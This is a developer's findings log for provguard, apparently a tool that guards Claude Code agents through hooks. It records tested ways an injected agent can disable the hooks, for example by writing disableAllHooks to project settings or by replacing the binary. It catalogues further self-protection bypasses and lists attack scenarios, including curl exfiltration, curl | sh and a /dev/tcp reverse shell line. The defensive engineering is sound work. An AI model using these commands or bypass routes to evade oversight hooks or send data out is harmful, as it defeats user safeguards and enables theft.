# Findings

Facts about agent hook behavior that affect provguard's design. Each entry says how it was checked.

Status: **docs** = read in official docs. **live** = tested on a real agent.

## Claude Code (docs checked 2026-11-16, code.claude.com/docs/en/hooks and /settings)

### F1. "allow" skips the user's permission prompt — docs
`permissionDecision: "allow"` bypasses the normal prompt. provguard must never return "allow" by default. In log-only mode it prints nothing. Later modes return only "deny" or "ask".

### F2. Errors and timeouts fail open — docs
- Exit 2 blocks the call. stderr is the reason.
- Any other non-zero exit is a non-blocking error. The tool call proceeds.
- A timeout does not block PreToolUse unless the hook sets `"onFailure": "block"`.
- Default command timeout is 600 s. `provguard init` sets 10 s.

**Design impact:** For `strict` mode, consider `onFailure: block` so a crash or a killed hook cannot open a gap. Test this in week 7.

### F3. Repo settings can turn off all hooks — **confirmed live**
`disableAllHooks` follows normal settings precedence. Project settings override user settings. A cloned repo with `.claude/settings.json` containing `"disableAllHooks": true` could turn off provguard. Only managed settings resist this (`allowManagedHooksOnly`, managed hooks).

Project hooks cannot remove user hooks. They only add.

**Live test (Claude Code 2.1.238, desktop app, Windows, 2026-11-16):**
1. provguard was installed in user settings and logged every call.
2. A tool call wrote `{"disableAllHooks": true}` to the project's `.claude/settings.json` in a running session.
3. The next tool calls were not logged. No prompt or warning was shown.
4. After the file was removed, logging resumed after about 2 tool calls (reload lag).

This means an agent under prompt injection can turn off provguard with one file write in the repo, in the middle of the session. A cloned repo can also ship the file.

**Design impact:**
1. Self-protection (DESIGN.md 6.6) must also cover **project** `.claude/settings.json` and `.claude/settings.local.json`, not only user settings. Writes to these files that touch `hooks` or `disableAllHooks` → **deny**. Also cover writes through Bash and PowerShell (`echo >`, `Set-Content`, `sed -i`).
2. Because of the reload lag, the deny must happen in PreToolUse, before the write.
3. Add `provguard doctor` to scan a repo for `disableAllHooks` and repo-level hooks before the user opens it.
4. Document managed settings (`allowManagedHooksOnly`, managed hooks) as the strong deployment for teams.
5. This may be worth a responsible-disclosure note to Anthropic, or at least a public write-up. Check first whether the workspace trust dialog shows this setting when a repo is first opened.

### F4. Settings edits reload live — docs
Hook settings reload without a restart. If an agent edits `~/.claude/settings.json`, the change takes effect at once. The self-protection rule in DESIGN.md 6.6 (deny writes to agent settings) is required, not optional. A `ConfigChange` hook event also exists; consider using it to detect tampering.

### F5. PostToolUse additionalContext reaches the model — **confirmed live**
`hookSpecificOutput.additionalContext` is added as a system reminder next to the tool result. Over 10,000 characters goes to a file plus a 2,000-character preview.

**Live test:** A project PostToolUse hook injected a canary phrase. It appeared after Bash, PowerShell, Write, Edit, Read and Agent calls. It also reached a subagent's WebFetch. The subagent called it "unrelated instructions" and ignored it.

**Design impact:** The soft-defense warning (DESIGN.md 5.5) reaches the model. But models may treat hook text as an injection and discount it. Keep it secondary. Write it as a plain fact ("Content from <url> is untrusted"), not as an order.

### F6. Payload facts — docs
- Common fields: `session_id`, `transcript_path`, `cwd`, `permission_mode`, `hook_event_name`. Subagents add `agent_id`, `agent_type`.
- Tool events have `tool_name`, `tool_input`, `tool_use_id`. PostToolUse adds `tool_response` and `duration_ms`.
- Tools: Bash, PowerShell, Read, Write, Edit, Glob, Grep, WebFetch, WebSearch, Agent, NotebookEdit and others. MCP: `mcp__<server>__<tool>`.
- On Windows, file paths arrive with backslashes.
- Matching hooks run in parallel. The session store (week 2) must lock.

### F7. Real payloads differ from docs in small ways — live
Recorded from Claude Code 2.1.238 on Windows. Sanitized copies are in `testdata/claudecode/real/`.
- Extra common fields: `prompt_id`, `effort`, `scratchpad_dir`.
- MCP calls have `mcp_server` as an **object**, `{"name": "...", "source": "..."}`. The first adapter version expected a string and failed on it. The real-fixture test caught this before release.
- MCP `tool_response` can be a JSON **list**, not an object.
- Subagent tool calls carry `agent_id` and `agent_type` and share the parent's `session_id`. Session-level taint therefore crosses subagents with no extra work.
- Subagent output returns to the parent through the `Agent` tool's `tool_response` (`content`, `handbackReport`). Week 2 must label that as untrusted when the subagent read untrusted content.
- Bash/PowerShell `tool_response`: `stdout`, `stderr`, `interrupted`, `isImage`. Read: `{type, file{...}}`. Edit and Write include `originalFile` and `structuredPatch`. WebFetch: `{url, code, bytes, result}`.
- Hooks from user settings run in the desktop app and in headless `claude -p`. Project hooks also ran in `-p` mode.

### F8. Windows lock-file race — found in week 2 tests
Creating a lock file with `O_EXCL` while another process's delete of it is still pending returns "Access is denied" on Windows, not "file exists". With parallel hooks this happens in real use. The session lock now retries on both errors. Test: `TestConcurrentUpdatesKeepEveryWrite` (50 parallel writers).

### F3 mitigation — live, week 2
With self-protection on, both attacks were blocked in a live session:
- Bash: `echo '{"disableAllHooks": true}' > .claude/settings.json` → denied.
- Write tool, same content → denied.
The agent sees the reason and is told to ask the user to do it in a terminal.

### F9. Keyword matching vs. parsing — week 3
- **False positive (week 2, live):** `git commit -m "...disableAllHooks..."` was denied because a regex matched text inside a quoted argument. With the parser, only resolved write targets and unreadable code count. Regression tests in `protect_test.go`.
- **False negatives the regex missed, now caught (live and in tests):** a variable path (`D=.claude; echo {} > "$D/settings.json"`), `bash -c '...'`, here-documents fed to `bash`, wrappers (`sudo tee`, `env … timeout … cp`), and `cd .claude && … > settings.json`.
- **PowerShell gaps found by tests and fixed:** grouping parentheses (`(iwr URL).Content`) were not analyzed. Commands inside `{ }` blocks (`if (…) { … }`, `ForEach-Object { … }`) were not analyzed. `$x` alone was wrongly treated as a command; PowerShell runs a variable only with `&` or `.`.
- Analysis cost: about 15 µs (Bash) and 20 µs (PowerShell) per command. That is negligible next to process start (M3).

### F10. Week 4 policy — results and false positives seen live (audit mode)
- 14 end-to-end scenarios pass (`cmd/provguard/scenario_test.go`): issue injection → `curl` exfil, `git remote add` / `git push` to an injected remote, `python -c` socket exfil, secret in URL, base64 secret in a DNS name, `curl | sh`, CI workflow edit, plus normal work sessions with no decision.
- A test caught a real gap before release: a hex/base64 secret inside a larger token (`https://x.test/<hex>`, `<hex>.evil.test`) was not decoded. Each part of a token is now decoded, and DNS labels are split on dots.
- **False positives seen live, kept for week 6 tuning:**
  1. `gh pr create` / `gh pr view` on the user's *own* repo marked the session untrusted (rule `shell_fetch:github_cli`). `gh` reads of repos whose owner is in `trusted_repo_owners` should not taint.
  2. The redactor's high-entropy rule redacted long Windows temp paths in the audit log (`C:[REDACTED:high_entropy]`). Path-like strings need an exception, but AWS secret keys contain `/`, so this needs care.
  3. Expected in tests, not yet seen live: in a tainted session, `npm install` asks (rule 4). This may be too noisy for normal "read docs, then install" work.
- Secret check cost: about 59 µs per call (benchmark).

### F11. Audit-log review found 3 more issues — fixed
Found by summarizing the live audit log (715 records, 7 sessions):
1. **False negative:** another session ran a loop of `gh repo delete` on several repositories. It was classed EGRESS, so the `destroy` rule never saw the most destructive action of the day. `gh repo/release/issue/gist/secret/... delete` and `gh api -X DELETE` are now DESTROY (would ask). Verified live with `gh repo delete --help`.
2. **False positive:** PowerShell expressions were read as unknown commands (OPAQUE): `@(...)`, then `"…"` strings and `([datetime]$x)`. Rule now: without `&` or `.`, PowerShell never runs a computed name, so any statement starting with an expression is not a command. Verified live.
3. **Bug (code review):** `python - <<EOF` heredocs were parsed as bash. Interpreter heredocs now go to the inline-code checks (network → EGRESS, writes → OPAQUE).
4. Smaller fix from the new tests: `gh api -X DELETE /path` reported `DELETE` as the target instead of the path.

Lesson: the audit log is the best test input. Real sessions produced 4 bugs in 1 review that ~200 written cases missed.

### F12. Week 5 benchmark — gaps found
- Writing case 08 showed that `bash -i >& /dev/tcp/HOST/PORT` (reverse shell) was treated as a file write. `/dev/tcp` and `/dev/udp` redirects are now EGRESS (`dev_tcp`), and `>& file` is a write.
- Case 08 itself stays **missed**: hooks never see auto-loaded `CLAUDE.md` / `AGENTS.md`. See docs/BENCHMARK.md.
- Replay: balanced blocks 8/12 and asks on 3/12; strict blocks 11/12. Live-agent runs are blocked on the expired CLI login.

### F13. Week 6 false-positive tuning
- Real data (418 tool calls, 8 sessions, audit mode): 5 would-be decisions; 10 of 13 untrusted labels came from `gh` reads of the user's own repo.
- 7 tuning changes and 2 new detections (see docs/BENCHMARK.md, "What the week 6 tuning changed").
- Normal-work corpus (30 tasks, 83 calls): 0 false positives in balanced, 1 intended ask. Attacks: balanced 8 blocked + 4 asked + 0 missed; strict 12/12 blocked.
- The trusted-owner features need `trusted_repo_owners` in `~/.provguard/config.json`. Without it, behavior is unchanged (safe default), so the user must set it to get the quieter behavior.

### F14. Week 7 hardening — bypasses closed
1. **Terminal MCP tool bypass (found in review, real tool seen in the audit log):** the desktop app's `mcp__terminal__run_in_terminal` runs shell commands outside the Bash tool, and no shell rule looked at it. MCP tools that run commands are now analyzed as both Bash and PowerShell, for self-protection, labels and policy. Bench case 13.
2. **Binary replacement:** hooks ran `bin/provguard.exe` in the project, which an agent could overwrite. `provguard init` now copies the binary to `~/.provguard/bin/` (guarded by self-protection) and points hooks there. Bench case 14. `--no-copy` keeps the old behavior; `doctor` reports it.
3. **`provguard doctor`:** checks that provguard's hooks exist and run an existing, protected binary; scans a repo for `disableAllHooks`, repo hooks, `.mcp.json` servers, and risky text in auto-loaded instruction files (network commands, pipe-to-shell, decode-and-run, injection phrases, hidden comments, invisible characters). It catches the F3 repo before it is opened.
4. **Fail closed in strict:** an internal error in a PreToolUse check now denies in `strict` (tested). `init` also writes `"onFailure": "block"` for strict. **Not verified live:** the `onFailure` key comes from the docs review (F2), not a live test.
5. **ConfigChange:** registered; on a settings change, provguard re-checks hook integrity and marks the session untrusted on tampering. **Not verified live:** the event's payload fields are unknown; the check uses only the session's cwd.
6. **PowerShell here-strings** (`@'…'@`) are parsed as one string.

### F15. Full security review (independent reviewer + own review) — CRIT and HIGH fixed
34 issues found; all 13 CRIT and 9 HIGH are fixed, each with a regression test (`*/review_test.go`). Spot-checks confirmed every claim tested.
- **Self-protection bypasses (CRIT), all verified before the fix:** Windows path spellings (trailing dot/space, `::$DATA`, `\\?\`, 8.3 names, `.\`), junctions and symlinks (Go's `EvalSymlinks` does not follow junctions, so provguard now uses `GetFinalPathNameByHandleW`), other file tools (MCP `write_file`/`move_file`, MultiEdit, NotebookEdit), copies with `-t`/Windows switches/directory destinations, `perl -pi`/`ruby -i`, script files written then run, archives and `git checkout -- path`, globs and `$'\x..'` escapes, implicit chdir (`env -C`, `git -C`), PowerShell `$x = cmd`, parameter abbreviations and `-Name:value`, and running provguard under another name.
- **HIGH:** settings keys `env` (could redirect `PROVGUARD_HOME`), `statusLine`, `apiKeyHelper` now guarded; loopback check by IP (was `HasPrefix("127.")`); every curl destination incl. `--connect-to`/`--proxy`; git remote trust checks the host, `pushurl`, `insteadOf` and `-c`; secrets scanned in commits before a push; new egress channels (openssl, certutil, busybox, dynamic URLs, `exec(b64decode)`); `sudo bash`/`"bash"` stdin shells; per-call `gh` trust (issue/PR text is outsider-written even in your own repo); labeling gaps; a Windows rename race that lost session updates.
- **Accepted trade-offs:** `git pull/merge/switch` that change a tracked `.claude/settings.json` are allowed (blocking them breaks normal work); `ConfigChange` and `doctor` watch for the result. Archive extraction into a folder that has a `.claude` folder is denied. Self-protection now costs about 4 ms per call (OS path resolution).
- **MED and LOW, also fixed (each with a test):** a slash-containing AWS secret leaked into the audit log through the path exemption (now only strings in path position are exempt); `rm -rf` never asked when cwd was the home folder or a root; a config typo or parse error silently meant "audit" (now balanced, reported by `doctor`); persistence paths (`authorized_keys2`, `.bash_aliases`, `.envrc`, `.pre-commit-config.yaml`, `.vscode/launch.json`, `.git/hooks` without a slash); audit logs are deleted after 30 days (`audit_retention_days`); stale-lock breaking could delete a fresh lock; settings backups are capped at 3; agents can no longer read `~/.provguard/key` or session files; path resolution is cached per hook call (self-protection ~2.7 ms for a multi-write command, was ~3.5 ms).
- Still open: 2 NITs (hook command quoting, outdated DESIGN.md). `package.json` scripts are deliberately not a persistence path (agents edit it constantly).

### F16. Trust indicator — and a false-positive source it exposed
- `provguard status` (CLI status line) and a one-time `systemMessage` notice on label changes. The docs confirm `systemMessage` is "shown to the user" but not for which events; the desktop Code tab's support for `statusLine` is undocumented, so a desktop-app mod shows the state there.
- Live `status` on the author's session showed it **sensitive** from `Edit: secret_in_output:bearer`: editing a test file that holds a fake `Bearer …` token. Fake credentials in test fixtures mark a session sensitive. Possible tuning: ignore token-like strings in files under `testdata/` or `*_test.*`, or in Edit tool output.

## Measurements

### M1. Hook latency, log-only (Windows 11, go1.27.4, 2026-11-16)
- 100 PreToolUse calls with a fixture, piped from PowerShell: wall p50 12.4 ms, p95 14.1 ms. This includes process start and PowerShell pipe overhead.
- In-process time is under 1 ms. The Windows clock is too coarse to show more, so `latency_us` logs 0. Use a finer timer if this matters later.
- Within the 20 ms p95 budget.

### M2. UTF-8 BOM on stdin — fixed
PowerShell pipes prepend a BOM. The parser rejected it, and the hook failed open with an error line. The adapter now strips the BOM. Test: `TestParseStripsBOM`.

### M3. Week 2 latency (same machine, later, under more load)
- Process start alone is about 26 ms p50 now. The week 1 binary measured the same, so the machine is slower than at M1, not the code.
- provguard's own work, measured in process:
  - Trusted result (most calls): p50 1.1 ms, p95 1.8 ms. Fast path: unlocked read, no write.
  - Untrusted result (lock + write): p50 5.7 ms, p95 7.3 ms. Most of this is Windows file operations.
- **Design impact:** process start dominates the total. The 20 ms p95 total budget is not met on a loaded Windows machine whatever provguard does. Options for week 7: a long-running daemon that the hook talks to, or fewer files per write. Track in-process time as the metric that provguard controls.

### M4. Week 7 latency (same machine, lighter load)
- PreToolUse with shell analysis + policy: p50 16.8 ms, p95 21.8 ms (wall).
- Process start alone: p50 14.4 ms, p95 17.0 ms. provguard's own work: about 2.4 ms.
- **Decision:** no background daemon for v0.1. Process start dominates and varies with machine load (14–26 ms seen); a daemon would add complexity and a new attack surface (a long-running process to protect). Revisit if users report slowness.

## Open — live tests still to run
- [x] F3: project `disableAllHooks: true` against user-level provguard hooks.
- [x] F5: canary phrase in `additionalContext` reaches the model.
- [x] Record real payloads for Bash, PowerShell, Read, Write, Edit, WebFetch, one MCP tool (F7).
- [ ] F3 follow-up: does the workspace trust dialog show `disableAllHooks` or repo hooks when a repo is first opened?
- [ ] Headless `claude -p` runs (blocked: CLI login expired on this machine).
- [ ] `onFailure: "block"` in strict: does a killed or timed-out hook really block the call?
- [ ] `ConfigChange`: payload fields, and whether it fires for project settings edits.
- [x] Hook latency p50/p95 over 100 calls (M1). Repeat inside a real Claude Code session.
